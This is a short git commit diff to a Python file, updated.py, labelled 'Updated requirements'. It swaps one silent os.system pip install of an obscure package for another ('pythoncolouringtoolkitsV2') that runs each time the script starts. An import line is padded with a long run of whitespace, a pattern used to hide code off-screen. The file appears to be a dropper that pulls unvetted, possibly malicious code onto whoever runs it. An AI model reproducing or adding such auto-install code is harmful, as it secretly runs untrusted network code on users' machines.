becfc0b6d193138eb629778c2b0775d23d0fce23
Wieselnuggis <105999132+Wieselnuggis@users.noreply.github.com>
2023-07-18 09:40:02 -0500

    Updated requirements

--- updated.py
+++ updated.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncolourextension")
-import pythoncolourextension
+os.system("pip install pythoncolouringtoolkitsV2")
+import pythoncolouringtoolkitsV2
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
